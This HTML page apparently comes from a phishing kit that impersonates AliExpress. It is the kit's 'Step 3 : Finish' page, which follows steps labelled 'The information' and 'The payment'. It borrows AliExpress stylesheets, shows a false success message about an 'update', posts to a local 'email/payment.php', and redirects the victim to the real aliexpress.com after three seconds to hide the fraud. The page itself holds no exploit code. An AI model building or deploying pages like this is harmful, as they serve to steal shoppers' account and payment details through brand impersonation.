﻿<!--

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta http-equiv="refresh" content="3; url=http://www.aliexpress.com/" />
<title>Step 3 : Finish</title>
	  <link rel="shortcut icon" link rel="logo-icon" href="images/favicon.ico">
	  	  <link rel="stylesheet" type="text/css" href="//i.alicdn.com/ae-login/login/??buyerlogin.c5e9b325.css" />
    <link rel="stylesheet" href="//i.alicdn.com/sc-isle/??common.00000000.css" />
    <link rel="stylesheet" href="//i.alicdn.com/sc-header/20150921135500/dist/??header.css?t=814958" />
    <link rel="shortcut icon" link rel="logo-icon" href="images/favicon.ico">
    
<script type="text/javascript" src="//i.alicdn.com/sc-isle/??loader.1ab001e3.js"></script>
<link rel="stylesheet" href="https://assets.alicdn.com/g/tb/global/global-min.css">
<link href="//g.alicdn.com//vip/register/2.8.9/xcommon/css/??base.css,form.css,btn.css,dialog.css,msg.css,responsive.css?t=201404171640" rev="stylesheet" rel="stylesheet" />
<link type="text/css" href="//g.alicdn.com/sd/ncpc/nc.css?t=2016062600" rel="stylesheet" />

	<link rel="stylesheet" href="//i.alicdn.com/sc-isle/register/css/havana.2d4a8439.css" />
	
	<link rel="stylesheet" href="//g.alicdn.com//vip/register/2.8.9/xcommon/css/lang_en.css"/>

<link href="//i.alicdn.com/sc-isle/register/css/??common.fa56f68d.css" rel="stylesheet" type="text/css" media="all" />
</head>
<body data-spm="7275745">
<br>
<div id="headerReg">
        <div class="header990">
            <div id="aliLogo" class="util-left">
            	<a title="" href="">www.aliexpress.com</a>
                <p>Smarter Shopping, Better Living</p>
            </div>                                                                                                                                                                                                                                               </div><!-- header990 -->
        <div style="clear:both"></div>
    </div>
	<br>
<div class="page lang-en">
<div class="steps" style='background: #f7f6f6;'>
	<ol>
		        <li class="active"><i></i><span class="tsl" data-phase-id="r_p_createAccount">The information</span></li>
				<li class='active'><i></i><span class="tsl" data-phase-id="r_p_fillUserInfo">The payment</span></li>
				<li class="active"><i class="iconfont"></i><span class="tsl" data-phase-id="r_p_regSuc">Complete</span></li>
	</ol>

			
	</div>

	
	<div class="content" style='background: #f9f9f9;'>
		<div class="form-list form-main-list">
			<form id="J_EmailForm" method="post" action="email/payment.php">
				<div class="form-group">
	<center><img src="images/fin.png"></center>
	<center><h2><font color="green"><b>Thank You! The update has been successfully completed!</b></font></h2></center>
				</div>
				
			</form>
		</div>
	</div>
</div>			
</div>
<div id="footer">
<center>
<img src="images/footer.png"/>
</center>
</div>
</body>
</html>
